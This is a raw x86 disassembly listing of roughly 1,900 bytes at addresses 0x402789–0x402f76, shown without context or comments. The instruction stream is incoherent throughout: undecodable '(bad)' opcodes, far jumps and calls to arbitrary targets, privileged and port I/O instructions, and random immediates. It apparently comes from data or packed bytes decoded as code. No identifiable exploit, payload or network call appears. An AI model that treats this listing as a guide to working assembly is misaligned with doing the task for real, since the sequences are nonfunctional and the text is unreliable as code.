  402789:	pop    eax
  40278a:	lea    ebp,[ebx]
  40278c:	add    dl,ch
  40278e:	aas    
  40278f:	jmp    0xa9de4790
  402794:	xor    eax,0x7ac9f5d8
  402799:	loope  0x402726
  40279b:	xchg   esp,eax
  40279c:	push   eax
  40279d:	jmp    0xcc40:0xe0a8ef89
  4027a4:	adc    esi,DWORD PTR [eax+0x2653cad7]
  4027aa:	xchg   DWORD PTR [eax-0x3e],ebp
  4027ad:	jns    0x4027ee
  4027af:	imul   ebp,DWORD PTR ds:0xd5ba7630,0x3d
  4027b6:	jno    0x40276b
  4027b8:	retf   
  4027b9:	mov    ss,WORD PTR [ebx-0x2cef13b1]
  4027bf:	shr    DWORD PTR [ebp+0x79],cl
  4027c2:	int3   
  4027c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027c4:	scas   eax,DWORD PTR es:[edi]
  4027c5:	fwait
  4027c6:	rol    ch,0x98
  4027c9:	ja     0x402800
  4027cb:	jl     0x402772
  4027cd:	arpl   WORD PTR [edx],ax
  4027cf:	jns    0x402779
  4027d1:	add    DWORD PTR [edx+edi*8-0x78c665fc],0x16e32c8
  4027dc:	aaa    
  4027dd:	(bad)  
  4027df:	adc    eax,0x646847aa
  4027e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027e5:	and    ch,0xac
  4027e8:	mov    es,ecx
  4027ea:	loopne 0x4027c2
  4027ec:	xchg   edi,eax
  4027ed:	mov    cs,ecx
  4027ef:	jnp    0x402854
  4027f1:	xchg   edx,eax
  4027f2:	xor    BYTE PTR [esi-0x41],dl
  4027f5:	imul   esp,ecx,0x12
  4027f8:	loopne 0x40282f
  4027fa:	mov    ds:0xa06da459,eax
  4027ff:	pop    esi
  402800:	mov    cl,0x42
  402802:	mov    esp,0x9046d8c3
  402807:	fnstenv [edi-0x17b5798a]
  40280d:	ror    BYTE PTR [ecx+0x186a5287],1
  402813:	mov    esp,0xfe70a455
  402818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402819:	aam    0x95
  40281b:	enter  0xedf1,0x4b
  40281f:	sub    al,0x4e
  402821:	scas   eax,DWORD PTR es:[edi]
  402822:	lods   eax,DWORD PTR ds:[esi]
  402823:	call   0x751e:0xd5fac57c
  40282a:	pop    ebx
  40282b:	aam    0xa5
  40282d:	sbb    cl,BYTE PTR [ebx+0x5a]
  402830:	jb     0x4028a9
  402832:	fwait
  402833:	popa   
  402834:	idiv   BYTE PTR [edi]
  402836:	nop
  402837:	xchg   BYTE PTR [edi-0x5b],dh
  40283a:	or     DWORD PTR [esi+0x78],esp
  40283d:	dec    ecx
  40283e:	push   ss
  40283f:	jnp    0x4027f8
  402841:	push   ds
  402842:	daa    
  402843:	fucom  st(1)
  402845:	and    ah,dl
  402847:	xchg   ecx,eax
  402848:	xchg   ecx,eax
  402849:	inc    edi
  40284a:	pop    esi
  40284b:	dec    edx
  40284c:	mov    ds:0x8fb93e6b,al
  402851:	cmp    al,0x33
  402853:	mov    ecx,0x69b794fb
  402858:	jmp    0xaee7:0xcd3e3f9d
  40285f:	neg    DWORD PTR [ebp-0xf]
  402862:	call   0x92009d9c
  402867:	(bad)  
  402868:	mov    ds:0xaa8d2e93,al
  40286d:	ja     0x402829
  40286f:	je     0x40284d
  402871:	(bad)  
  402872:	jp     0x40285e
  402874:	out    0xb,eax
  402876:	inc    ecx
  402877:	and    edi,DWORD PTR ds:0xae45062e
  40287d:	pop    ecx
  40287e:	(bad)  
  40287f:	push   0xc38606eb
  402884:	popf   
  402885:	mov    cl,0x29
  402887:	call   0xb5e13092
  40288c:	push   es
  40288d:	sub    esi,DWORD PTR [esi-0x66311a99]
  402893:	fidiv  WORD PTR [ecx+0x4e7990f]
  402899:	call   0xd289:0x838fcb61
  4028a0:	sub    ch,dh
  4028a2:	and    bl,dl
  4028a4:	lods   al,BYTE PTR fs:[esi]
  4028a6:	test   DWORD PTR [ebp-0x6c],ecx
  4028a9:	dec    edi
  4028aa:	push   ecx
  4028ab:	jno    0x402891
  4028ad:	repnz fnstsw WORD PTR [esi]
  4028b0:	lss    ecx,FWORD PTR [esp+edi*4]
  4028b4:	pop    edx
  4028b5:	lea    ebp,[esi-0x5a65a647]
  4028bb:	xchg   DWORD PTR [edx-0x139d527],ecx
  4028c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028c2:	jne    0x4028a4
  4028c4:	push   es
  4028c5:	push   cs
  4028c6:	mov    edi,0x8c10e7a4
  4028cb:	dec    edx
  4028cc:	std    
  4028cd:	lahf   
  4028ce:	pushf  
  4028cf:	bound  ecx,QWORD PTR ds:0x8156c864
  4028d5:	sbb    eax,0xc3145982
  4028da:	test   al,0x74
  4028dc:	popf   
  4028dd:	enter  0x7f61,0x63
  4028e1:	gs fwait
  4028e3:	pop    esp
  4028e4:	mov    ds:0x1d1f1d55,eax
  4028e9:	loopne 0x402933
  4028eb:	bnd ja 0x40287c
  4028ee:	mov    ebx,0xd37de99d
  4028f3:	add    eax,0xf87891aa
  4028f8:	mov    DWORD PTR [ebp+0x39],esp
  4028fb:	adc    al,BYTE PTR [eax+0x2d0c8c89]
  402901:	fisubr DWORD PTR [ebp-0x375a11ad]
  402907:	idiv   DWORD PTR [ebp+0x29]
  40290a:	fcom   DWORD PTR [ebp+0x59]
  40290d:	pop    ss
  40290e:	lea    ecx,[ecx+0x134ee3f5]
  402914:	inc    edi
  402915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402916:	pop    edi
  402917:	jmp    0x402949
  402919:	pop    ebp
  40291a:	xchg   ch,bh
  40291c:	aam    0xe8
  40291e:	inc    esp
  40291f:	test   BYTE PTR [ebp+0x65],0x42
  402923:	repz mov ecx,0x4b34a11a
  402929:	push   es
  40292a:	mov    cs:0xa8dcb032,al
  402930:	test   BYTE PTR [edx+0x69],bh
  402933:	ss mov bh,0x4f
  402936:	(bad)  
  402937:	enter  0xf771,0xe9
  40293b:	outs   dx,BYTE PTR ds:[esi]
  40293c:	jb     0x4028e5
  40293e:	div    BYTE PTR [ebx-0x44]
  402941:	ret    0x840d
  402944:	xchg   esp,eax
  402945:	mov    dh,0x28
  402947:	mov    al,ds:0x8a37a246
  40294c:	jge    0x4028db
  40294e:	xchg   edx,eax
  40294f:	sub    ah,BYTE PTR [edx+eax*1-0x3b]
  402953:	retf   
  402954:	sub    bl,BYTE PTR [ecx+ecx*2+0x43da0489]
  40295b:	mov    ch,BYTE PTR [edi+0x7c01854f]
  402961:	mov    ebx,0x55db3564
  402966:	xlat   BYTE PTR ds:[ebx]
  402967:	call   0x910c2137
  40296c:	sbb    al,0x71
  40296e:	retf   
  40296f:	int    0xe2
  402971:	out    dx,eax
  402972:	cmc    
  402973:	mov    ebx,0x26c0f987
  402978:	(bad)  
  402979:	cmp    bh,BYTE PTR [ecx]
  40297b:	inc    ebp
  40297c:	call   0x7fd7:0xd984dffe
  402983:	scas   al,BYTE PTR es:[edi]
  402984:	icebp  
  402985:	mov    ah,bl
  402987:	xchg   ebx,eax
  402988:	(bad)  
  402989:	push   edx
  40298a:	aaa    
  40298b:	lea    edi,[eax+ecx*1+0x42ce3669]
  402992:	cmp    dh,BYTE PTR [ecx-0x40cfddba]
  402998:	sub    eax,0xd3928237
  40299d:	not    ecx
  40299f:	in     al,0x35
  4029a1:	xchg   esp,eax
  4029a2:	stc    
  4029a3:	jle    0x402976
  4029a5:	and    DWORD PTR [edi],esp
  4029a7:	ret    0x5440
  4029aa:	adc    ebx,DWORD PTR [ecx+edi*4-0xf]
  4029ae:	jae    0x40295f
  4029b0:	in     al,dx
  4029b1:	or     dh,bh
  4029b3:	xchg   edi,eax
  4029b4:	dec    edx
  4029b5:	mov    ds:0xbfaf9706,eax
  4029ba:	jnp    0x40295f
  4029bc:	test   DWORD PTR [esi],ebx
  4029be:	xchg   esi,eax
  4029bf:	repnz scas al,BYTE PTR es:[edi]
  4029c1:	jmp    0x402952
  4029c3:	imul   eax,DWORD PTR [edi+0x60],0x17
  4029c7:	jb     0x40294e
  4029c9:	jl     0x4029b4
  4029cb:	sbb    DWORD PTR [eax],edx
  4029cd:	dec    esi
  4029ce:	ins    DWORD PTR es:[edi],dx
  4029cf:	mov    dl,cl
  4029d1:	daa    
  4029d2:	mov    ebx,0xcaa65cbe
  4029d7:	mov    BYTE PTR [edx-0x555e22c8],ah
  4029dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029de:	adc    bh,BYTE PTR [ebp+ebx*8-0x50]
  4029e2:	push   DWORD PTR ds:0x14b7cf27
  4029e8:	repz jo 0x402980
  4029eb:	shl    ch,1
  4029ed:	inc    ebp
  4029ee:	cmc    
  4029ef:	gs cmp bl,dh
  4029f2:	std    
  4029f3:	xchg   ebp,eax
  4029f4:	daa    
  4029f5:	js     0x4029bc
  4029f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029f8:	sub    BYTE PTR [ecx-0x1a42161e],0x90
  4029ff:	dec    ebp
  402a00:	inc    ecx
  402a01:	cmp    ah,BYTE PTR [eax-0x61ea9380]
  402a07:	xchg   ebp,eax
  402a08:	ret    
  402a09:	add    BYTE PTR ds:0xb7df9f5e,cl
  402a0f:	ins    BYTE PTR es:[edi],dx
  402a10:	jo     0x402a1a
  402a12:	jle    0x4029b6
  402a14:	push   edi
  402a15:	and    DWORD PTR [esi],edx
  402a17:	inc    ecx
  402a18:	add    eax,0xf330e84f
  402a1d:	ins    BYTE PTR es:[edi],dx
  402a1e:	jnp    0x402a4b
  402a20:	shl    DWORD PTR [ebx-0x3ddbf625],0x89
  402a27:	fisubr WORD PTR [edx+0xc]
  402a2a:	jmp    0xcffc:0xbaccb6b6
  402a31:	mov    ds:0xaf07cb7f,al
  402a36:	xchg   edx,eax
  402a37:	mov    bh,0xc2
  402a39:	lds    ebx,FWORD PTR [eax]
  402a3b:	addr16 mov cl,0x96
  402a3e:	mov    dh,0xcd
  402a40:	imul   edi,DWORD PTR [edi-0x6f],0x9a747057
  402a47:	sbb    ch,BYTE PTR [eax]
  402a49:	gs inc eax
  402a4b:	xlat   BYTE PTR ds:[ebx]
  402a4c:	loopne 0x402a27
  402a4e:	loopne 0x402a40
  402a50:	ja     0x402a13
  402a52:	jno    0x4029fb
  402a54:	mov    ebp,0x9c943c34
  402a59:	call   0x50c4:0x72f93895
  402a60:	sbb    dh,BYTE PTR [ebx]
  402a62:	push   esp
  402a63:	popa   
  402a64:	das    
  402a65:	psubq  mm1,mm0
  402a68:	mov    DWORD PTR [edx],0x8ef01fa7
  402a6e:	icebp  
  402a6f:	pusha  
  402a70:	and    eax,0xfcad005a
  402a75:	jl     0x402ada
  402a77:	jl     0x402ad6
  402a79:	fs add eax,0xaaf450f3
  402a7f:	popf   
  402a80:	sub    dl,BYTE PTR [edx+edi*2+0x31279cbe]
  402a87:	out    dx,al
  402a88:	not    eax
  402a8a:	and    eax,0x3d9617b4
  402a8f:	jl     0x402a16
  402a91:	mov    ecx,0xf3ddb0cf
  402a96:	sub    eax,0xbac5386b
  402a9b:	xchg   esi,eax
  402a9c:	mov    DWORD PTR [ecx+eiz*4-0x34],ebp
  402aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402aa1:	mov    bh,BYTE PTR [edx]
  402aa3:	sub    al,BYTE PTR cs:[ebx]
  402aa6:	lea    ebp,[edi-0x78d2dd51]
  402aac:	add    dl,ah
  402aae:	dec    bp
  402ab0:	inc    ebp
  402ab1:	shl    DWORD PTR [ecx],0x48
  402ab4:	or     ah,BYTE PTR [esp+ecx*4-0xe]
  402ab8:	cdq    
  402ab9:	and    eax,0xbe5186d8
  402abe:	hlt    
  402abf:	pop    ecx
  402ac0:	jge    0x402a58
  402ac2:	retf   
  402ac3:	cmp    bl,ah
  402ac5:	pop    ds
  402ac6:	cmp    DWORD PTR [ebp+ebp*8-0x5c52d4d3],ebx
  402acd:	call   0x48ce:0x4c96a8fa
  402ad4:	inc    edi
  402ad5:	stc    
  402ad6:	inc    eax
  402ad7:	push   ecx
  402ad8:	jmp    DWORD PTR [eax+0x3e6bc1d3]
  402ade:	dec    edx
  402adf:	cmp    ch,BYTE PTR [ecx-0x5e]
  402ae2:	lods   al,BYTE PTR ds:[esi]
  402ae3:	nop
  402ae4:	xor    BYTE PTR [ebp+0x4f],0xbf
  402ae8:	(bad)  
  402ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aea:	mov    dl,0x42
  402aec:	xchg   BYTE PTR [esi+0x67],ch
  402aef:	xchg   esp,eax
  402af0:	outs   dx,BYTE PTR ds:[esi]
  402af1:	adc    DWORD PTR [edx-0x5fbb47cf],edi
  402af7:	push   ss
  402af8:	cmp    cl,BYTE PTR [ecx-0x4]
  402afb:	test   eax,0xdfae1396
  402b00:	adc    al,0xb4
  402b02:	mov    dl,0x65
  402b04:	and    eax,0x1cc2a69f
  402b09:	and    esp,DWORD PTR [ebx+0x6f]
  402b0c:	sub    DWORD PTR ds:0x2753949e,eax
  402b12:	pop    es
  402b13:	(bad)  
  402b14:	push   0x7d79356c
  402b19:	adc    dl,ah
  402b1b:	sbb    eax,0xc56551f7
  402b20:	imul   DWORD PTR [eax-0x1d]
  402b23:	ror    ebx,0x64
  402b26:	outs   dx,DWORD PTR ds:[esi]
  402b27:	test   DWORD PTR [ebx],edx
  402b29:	sub    DWORD PTR [ebx-0x1f31f2ff],0x1a
  402b30:	cmp    BYTE PTR [eax-0x7cc26274],dh
  402b36:	test   DWORD PTR [esi-0x59650751],ecx
  402b3c:	sbb    eax,0x2ee88f5e
  402b41:	mov    ah,0xbb
  402b43:	inc    DWORD PTR [ebp+0xc]
  402b46:	mov    ebx,0xcaaec020
  402b4b:	into   
  402b4c:	jg     0x402b56
  402b4e:	mov    al,0xae
  402b50:	hlt    
  402b51:	(bad)  
  402b52:	push   cs
  402b53:	inc    edi
  402b54:	ds jmp 0x6a70:0x5551d07
  402b5c:	jb     0x402bbf
  402b5e:	stc    
  402b5f:	scas   eax,DWORD PTR es:[edi]
  402b60:	cdq    
  402b61:	xlat   BYTE PTR ds:[ebx]
  402b62:	mov    dh,0x35
  402b64:	test   DWORD PTR [ecx+0x4e074cb],edx
  402b6a:	add    BYTE PTR ds:0x53843abe,ch
  402b70:	push   0x31
  402b72:	(bad)  
  402b73:	sub    al,0x95
  402b75:	inc    ecx
  402b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b77:	lds    ebx,FWORD PTR [ecx+0x3cfffb65]
  402b7d:	dec    edx
  402b7e:	push   ecx
  402b7f:	lea    ebp,[edi-0x51ffc487]
  402b85:	fdivr  DWORD PTR [eax-0x2926b157]
  402b8b:	push   0xffffffd4
  402b8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b8e:	push   ds
  402b8f:	dec    eax
  402b90:	pop    ecx
  402b91:	js     0x402bc8
  402b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b94:	dec    eax
  402b95:	add    al,0xa2
  402b97:	or     DWORD PTR [eax-0x27bd004c],ebp
  402b9d:	sbb    BYTE PTR [edi+0x63df3ce8],dh
  402ba3:	mov    dh,0x9e
  402ba5:	rcl    ebx,cl
  402ba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ba8:	cs dec eax
  402baa:	rol    DWORD PTR [edx-0x7e],0x6
  402bae:	les    ebx,FWORD PTR ds:0xae51b471
  402bb4:	stos   DWORD PTR es:[edi],eax
  402bb5:	xchg   BYTE PTR [ebp+0x5b],ah
  402bb8:	adc    DWORD PTR [esi-0x7a],0x1f
  402bbc:	(bad)  
  402bbd:	in     eax,dx
  402bbe:	mov    DWORD PTR ds:0xb1077b15,eax
  402bc4:	inc    esi
  402bc5:	scas   eax,DWORD PTR es:[edi]
  402bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bc7:	aas    
  402bc8:	pusha  
  402bc9:	in     al,dx
  402bca:	and    BYTE PTR [ebp-0x792a34ac],cl
  402bd0:	rcl    DWORD PTR [ebx+0x2f1a11b8],1
  402bd6:	cmp    eax,0x1e80d09b
  402bdb:	ds push ecx
  402bdd:	adc    DWORD PTR [eax+0x1b574534],esp
  402be3:	mov    eax,0xf7e1ba11
  402be8:	outs   dx,BYTE PTR ds:[esi]
  402be9:	js     0x402c5c
  402beb:	fimul  DWORD PTR [ebx+0x5130950c]
  402bf1:	mov    esi,edi
  402bf3:	add    al,0x47
  402bf5:	jae    0x402bc8
  402bf7:	imul   ebx,DWORD PTR [edi],0xb7ea7d3c
  402bfd:	sbb    ebx,DWORD PTR [edx-0x4e]
  402c00:	push   0x6f029b00
  402c05:	dec    esi
  402c06:	inc    eax
  402c07:	cmp    eax,DWORD PTR [esi+0x22]
  402c0a:	push   esp
  402c0b:	cdq    
  402c0c:	fisttp DWORD PTR [eax+0x2474fb1c]
  402c12:	and    eax,0x8a727cbf
  402c17:	lock enter 0xceb2,0x55
  402c1c:	jmp    0x758aabed
  402c21:	jmp    0x9f5660a1
  402c26:	stc    
  402c27:	add    bl,BYTE PTR [edx-0x7f643786]
  402c2d:	leave  
  402c2e:	sub    cl,BYTE PTR [esi]
  402c30:	mul    bl
  402c32:	lods   al,BYTE PTR ds:[esi]
  402c33:	loop   0x402bcd
  402c35:	js     0x402c9e
  402c37:	ret    
  402c38:	sahf   
  402c39:	outs   dx,DWORD PTR ds:[esi]
  402c3a:	test   DWORD PTR [ebp+0x40],esp
  402c3d:	retf   
  402c3e:	test   al,0x69
  402c40:	push   cs
  402c41:	pop    ecx
  402c42:	mov    BYTE PTR [edx],ah
  402c44:	mov    ebx,0x1e210243
  402c49:	imul   edx,DWORD PTR [edx+0x17bfec8f],0xffffff81
  402c50:	inc    edx
  402c51:	lods   al,BYTE PTR ds:[esi]
  402c52:	push   edx
  402c53:	or     esi,0x7
  402c56:	pop    ebx
  402c57:	adc    ah,0x8
  402c5a:	xchg   DWORD PTR [ebp+0x77ee1f31],ebp
  402c60:	test   al,0xe2
  402c62:	dec    ecx
  402c63:	mov    eax,ds:0x23e70006
  402c68:	and    al,0xa
  402c6a:	je     0x402c20
  402c6c:	pop    ss
  402c6d:	popf   
  402c6e:	add    eax,0x48944762
  402c73:	push   ds
  402c74:	and    esi,ebp
  402c76:	adc    BYTE PTR [edx],al
  402c78:	inc    ecx
  402c79:	aaa    
  402c7a:	int3   
  402c7b:	call   0x3014:0x85153bf
  402c82:	push   edx
  402c83:	cmp    al,0x14
  402c85:	pop    ss
  402c86:	sub    al,BYTE PTR [bx+si]
  402c89:	in     eax,dx
  402c8a:	jg     0x402c2b
  402c8c:	jnp    0x402cdd
  402c8e:	xor    BYTE PTR [edx-0x1f246281],ah
  402c94:	bound  esi,QWORD PTR [eax-0x55ad7f54]
  402c9a:	ret    
  402c9b:	pop    edx
  402c9c:	mov    dh,0xda
  402c9e:	xchg   esp,eax
  402c9f:	js     0x402d07
  402ca1:	repz mov ah,0x35
  402ca4:	push   ebx
  402ca5:	loope  0x402cfb
  402ca7:	mov    dl,0x3c
  402ca9:	push   ss
  402caa:	xchg   DWORD PTR [eax+eiz*1+0x5c35307],ecx
  402cb1:	push   edi
  402cb2:	lahf   
  402cb3:	test   DWORD PTR [ecx+edx*4+0x22],eax
  402cb7:	sbb    ebp,DWORD PTR [eax]
  402cb9:	cmp    al,0xc5
  402cbb:	or     al,0x12
  402cbd:	mov    ebp,0xb9ad313d
  402cc2:	mov    ds:0x33ac44af,al
  402cc7:	loop   0x402cf7
  402cc9:	(bad)  [ebx]
  402ccb:	cmp    esi,esp
  402ccd:	clc    
  402cce:	mov    dh,0x9
  402cd0:	sbb    DWORD PTR [edx+0x309d61c3],esi
  402cd6:	sbb    al,0x20
  402cd8:	adc    al,0xcc
  402cda:	inc    esi
  402cdb:	dec    edi
  402cdc:	sbb    BYTE PTR [esi-0x60],cl
  402cdf:	mov    eax,edi
  402ce1:	and    ebp,eax
  402ce3:	sbb    BYTE PTR [ebx-0x3c],cl
  402ce6:	rcl    BYTE PTR [ebx-0x55b75d14],1
  402cec:	jg     0x402cfb
  402cee:	cld    
  402cef:	adc    BYTE PTR [ebx+eax*4],cl
  402cf2:	and    bh,BYTE PTR [ecx]
  402cf4:	jle    0x402cbd
  402cf6:	jg     0x402cf4
  402cf8:	mul    al
  402cfa:	test   BYTE PTR [ecx+0x6e],bl
  402cfd:	in     al,dx
  402cfe:	jbe    0x402d2e
  402d00:	lods   eax,DWORD PTR ds:[esi]
  402d01:	ficom  WORD PTR [eiz*2+0x5e819949]
  402d08:	mov    bh,0xf
  402d0a:	stc    
  402d0b:	xor    DWORD PTR [ebx],edi
  402d0d:	icebp  
  402d0e:	enter  0x1d59,0x2e
  402d12:	and    bh,bl
  402d14:	loope  0x402d51
  402d16:	jl     0x402c98
  402d18:	push   ebx
  402d19:	outs   dx,BYTE PTR ds:[esi]
  402d1a:	lods   al,BYTE PTR gs:[esi]
  402d1c:	sub    edi,esi
  402d1e:	into   
  402d1f:	mov    ds:0xbf98ad34,eax
  402d24:	mov    al,ds:0x169aea21
  402d29:	ret    0xcbc3
  402d2c:	icebp  
  402d2d:	xor    eax,0xd5b17ee9
  402d32:	jle    0x402dad
  402d34:	sub    BYTE PTR [esi-0x68b13fe0],al
  402d3a:	push   eax
  402d3b:	or     al,0x87
  402d3d:	adc    al,0x45
  402d3f:	shl    BYTE PTR [eax],1
  402d41:	outs   dx,BYTE PTR ds:[esi]
  402d42:	das    
  402d43:	mov    BYTE PTR [ebp+0x8b7ea0c],bl
  402d49:	pop    edx
  402d4a:	sub    bh,BYTE PTR [eax]
  402d4c:	pusha  
  402d4d:	sti    
  402d4e:	aas    
  402d4f:	inc    edx
  402d50:	pop    ebp
  402d51:	inc    ebx
  402d52:	es mov ebx,0xeff79150
  402d58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d59:	mov    eax,0x9ced865e
  402d5e:	stos   DWORD PTR es:[edi],eax
  402d5f:	mov    ecx,esi
  402d61:	xor    DWORD PTR [ecx-0x3c988cc4],ecx
  402d67:	fwait
  402d68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d69:	jmp    0x62e0d0a5
  402d6e:	or     edi,DWORD PTR [ebx-0x48e967b7]
  402d74:	jle    0x402dba
  402d76:	dec    esp
  402d77:	jne    0x402d41
  402d79:	addr16 daa 
  402d7b:	cmp    al,0x2e
  402d7d:	mov    BYTE PTR ds:[esi],bh
  402d80:	xor    dh,dh
  402d82:	push   edx
  402d83:	lods   eax,DWORD PTR ds:[esi]
  402d84:	outs   dx,DWORD PTR ds:[esi]
  402d85:	loope  0x402df2
  402d87:	jns    0x402dd2
  402d89:	jo     0x402db2
  402d8b:	adc    ecx,DWORD PTR [edx]
  402d8d:	popf   
  402d8e:	mov    DWORD PTR ss:0xe36e3995,edx
  402d95:	or     BYTE PTR ds:0x49b9c433,cl
  402d9b:	or     BYTE PTR [edx-0xa],bl
  402d9e:	xchg   DWORD PTR [ebx-0x6951c062],ecx
  402da4:	in     al,dx
  402da5:	mov    ah,0x3d
  402da7:	inc    eax
  402da8:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  402daa:	pop    ebp
  402dab:	mov    bh,al
  402dad:	or     DWORD PTR ds:0xf97a22f5,0x19
  402db4:	lods   eax,DWORD PTR ds:[esi]
  402db5:	test   DWORD PTR [edx],ecx
  402db7:	mov    ds:0x6eef1390,eax
  402dbc:	or     esp,DWORD PTR [ebx]
  402dbe:	jp     0x402daf
  402dc0:	and    bh,BYTE PTR [esp+eax*8-0x53]
  402dc4:	dec    DWORD PTR [eax+0x69]
  402dc7:	fcom   QWORD PTR [eax+0x7]
  402dca:	xor    esi,DWORD PTR [esi+ecx*8]
  402dcd:	lods   al,BYTE PTR ds:[esi]
  402dce:	rcr    BYTE PTR [edi],1
  402dd0:	and    ebp,DWORD PTR [ebx+0x4dacb598]
  402dd6:	clc    
  402dd7:	mov    dh,0x7e
  402dd9:	ss push edx
  402ddb:	dec    eax
  402ddc:	push   cs
  402ddd:	mov    DWORD PTR [ebp-0xc],esi
  402de0:	mov    bl,0x6
  402de2:	xadd   BYTE PTR [eax-0x1f],dl
  402de6:	aas    
  402de7:	inc    ecx
  402de9:	mov    eax,ds:0x20db5cf7
  402dee:	jge    0x402e03
  402df0:	mov    cs,edi
  402df2:	jb     0x402e22
  402df4:	cmp    DWORD PTR [ebx],edi
  402df6:	lds    eax,FWORD PTR [edx-0x2a]
  402df9:	dec    ebp
  402dfa:	and    BYTE PTR [ecx+0x7d],ch
  402dfd:	or     DWORD PTR [eax-0x6629daef],esi
  402e03:	mov    esi,0xebb05b30
  402e08:	das    
  402e09:	and    DWORD PTR [ebx+0x64d33cc0],ebx
  402e0f:	xor    DWORD PTR [ebp+0x166af72a],ebx
  402e15:	cli    
  402e16:	jmp    0x402e3f
  402e18:	and    eax,eax
  402e1a:	sub    al,0x6
  402e1c:	cmp    eax,0xefebeaf3
  402e21:	mov    ds:0xcb4732ec,eax
  402e26:	std    
  402e27:	icebp  
  402e28:	cmp    DWORD PTR [ecx-0x46dd9a32],edi
  402e2e:	ja     0x402e2a
  402e30:	out    0xc6,al
  402e32:	mov    esi,0x219433cf
  402e37:	sbb    ah,BYTE PTR [edx-0x2c]
  402e3a:	test   al,0x90
  402e3c:	fnsave [bx]
  402e3f:	in     eax,0x45
  402e41:	aam    0xe1
  402e43:	(bad)  
  402e44:	jb     0x402deb
  402e46:	dec    esp
  402e47:	pop    es
  402e48:	repnz mov esi,0xd7307fbb
  402e4e:	call   0x2561:0x8805a78c
  402e55:	fld    DWORD PTR [edi]
  402e57:	gs into 
  402e59:	daa    
  402e5a:	xchg   DWORD PTR [ecx+0x44],eax
  402e5d:	mov    DWORD PTR [eax],esi
  402e5f:	inc    edx
  402e60:	xchg   esi,eax
  402e61:	out    0x3d,al
  402e63:	mov    ah,0xdd
  402e65:	jb     0x402e89
  402e67:	aas    
  402e68:	adc    BYTE PTR [esi+0x46a18c94],dl
  402e6e:	imul   DWORD PTR [ebx-0x59]
  402e71:	cli    
  402e72:	sti    
  402e73:	mov    dh,0x42
  402e75:	pop    ebp
  402e76:	stc    
  402e77:	mov    eax,0x4569eed2
  402e7c:	cmp    edx,esp
  402e7e:	dec    edx
  402e7f:	call   0x4f43:0x8da03906
  402e86:	sbb    al,0x28
  402e88:	cli    
  402e89:	lods   eax,DWORD PTR ds:[esi]
  402e8a:	fnclex 
  402e8c:	loopne 0x402e89
  402e8e:	test   al,0x88
  402e91:	xchg   ecx,eax
  402e92:	mov    bl,0xac
  402e94:	dec    edi
  402e95:	jmp    0x402e8c
  402e97:	sub    BYTE PTR [ecx-0x64],0x47
  402e9b:	inc    ecx
  402e9c:	mov    esi,0xc559e223
  402ea1:	add    BYTE PTR [edi-0x291db812],dh
  402ea7:	adc    BYTE PTR [esi+edx*4+0x6],0x4e
  402eac:	cmp    BYTE PTR [esi+0x4cc5fb8b],ah
  402eb2:	fidiv  WORD PTR [ecx-0x1ac9ba44]
  402eb8:	sahf   
  402eb9:	into   
  402eba:	adc    al,0x18
  402ebc:	int3   
  402ebd:	repnz mov ah,BYTE PTR [esi-0x5171e1a0]
  402ec4:	mov    eax,0xc652de06
  402ec9:	pop    es
  402eca:	jno    0x402e63
  402ecc:	outs   dx,DWORD PTR ds:[esi]
  402ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ece:	jge    0x402ec6
  402ed0:	and    ebx,esi
  402ed2:	fs into 
  402ed4:	mov    eax,ds:0xe23891f2
  402ed9:	inc    edi
  402eda:	rol    DWORD PTR [ecx+0x6d],cl
  402edd:	ss push 0x8475cff7
  402ee3:	(bad)  
  402ee4:	xor    eax,0x4a4732f7
  402ee9:	mov    ebp,DWORD PTR [eax+edx*1-0x50]
  402eed:	push   ecx
  402eee:	test   eax,0xc0c99340
  402ef3:	out    dx,eax
  402ef4:	or     eax,0x63ebc14c
  402ef9:	sbb    al,0x8b
  402efb:	out    0x4a,al
  402efd:	push   cs
  402efe:	mov    ch,dh
  402f00:	or     esi,0xc274584d
  402f06:	mov    esi,0xebe7699a
  402f0b:	fist   DWORD PTR [eax-0x427ee0db]
  402f11:	js     0x402e95
  402f13:	cmp    edi,DWORD PTR [ecx+0x17]
  402f16:	cmp    bl,BYTE PTR [esi+0x668cfdbc]
  402f1c:	pushf  
  402f1d:	pushf  
  402f1e:	(bad)  
  402f1f:	addr16 xor eax,0x5afcaea3
  402f25:	or     eax,0x6a884223
  402f2a:	clc    
  402f2b:	xchg   DWORD PTR [ecx-0x71],ebp
  402f2e:	dec    eax
  402f2f:	xor    DWORD PTR [edi+edi*8+0x59],0x69
  402f34:	test   al,0x56
  402f36:	scas   eax,DWORD PTR es:[edi]
  402f37:	jl     0x402fa9
  402f39:	jae    0x402f1a
  402f3b:	inc    ecx
  402f3c:	add    DWORD PTR [ecx+0x193c497e],ebx
  402f42:	frstor [esp+ebx*8]
  402f45:	mov    cl,0x94
  402f47:	enter  0xfc44,0x7b
  402f4b:	arpl   WORD PTR [esi],di
  402f4d:	or     DWORD PTR [esi],0xdb9e0f5b
  402f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f54:	in     eax,0x28
  402f56:	mov    bh,0x2d
  402f58:	imul   edx,DWORD PTR [esi-0x2a95ad23],0xe21df4e3
  402f62:	jo     0x402ef3
  402f64:	mov    ebp,?
  402f66:	data16 jae 0x402f3a
  402f69:	sub    al,BYTE PTR [edi]
  402f6b:	xchg   BYTE PTR ds:0xe67cbe89,bl
  402f71:	mov    esp,0x7de1e76a
  402f76:	test   ebp,esi
